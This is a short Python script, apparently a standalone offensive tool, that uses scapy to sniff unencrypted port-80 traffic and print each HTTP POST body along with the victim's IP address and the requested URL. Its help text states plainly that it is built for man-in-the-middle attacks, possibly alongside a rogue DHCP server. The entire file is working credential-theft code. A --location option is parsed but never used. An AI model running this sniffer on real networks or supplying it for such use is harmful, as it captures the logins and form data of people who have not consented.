#!/bin/python3
import argparse
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import IP
from scapy.packet import Raw
from scapy.sendrecv import sniff


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def credentialsSniffing(packet):
    try:
        if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == "POST" and packet.haslayer(Raw):
            url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
            ipVictim = packet[IP].src
            try:
                credentials = packet[Raw].load.decode("utf-8")
            except:
                credentials = packet[Raw].load

            print(f'{bcolors.OKBLUE}---New HTTP POST---{bcolors.ENDC}')
            print(f"{bcolors.FAIL}[*]{bcolors.ENDC} From: {ipVictim} {bcolors.WARNING}{credentials} {bcolors.ENDC}{bcolors.UNDERLINE}{url}{bcolors.ENDC}")
    except:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="This script is a plain text credentials sniffer. It will show you HTTP POST. "
                                                 "It is developed to be used in man in the middle attacks (maybe with a dhcp server?). "
                                                 "If you are using it with a dhcp server, you need to enable forwarding.")
    parser.add_argument("-l", "--location", required=False, help="Location of the domains .txt. This file need to be in JSON format. ")
    parser.add_argument("-i", "--interface", required=False, help="Network interface")
    args = parser.parse_args()
    print("Sniffing HTTP credentials...")
    if args.interface is None:
        sniff(filter="tcp and (port 80)", prn=credentialsSniffing)
    else:
        sniff(iface=args.interface, filter=f"tcp and port 80", prn=credentialsSniffing)

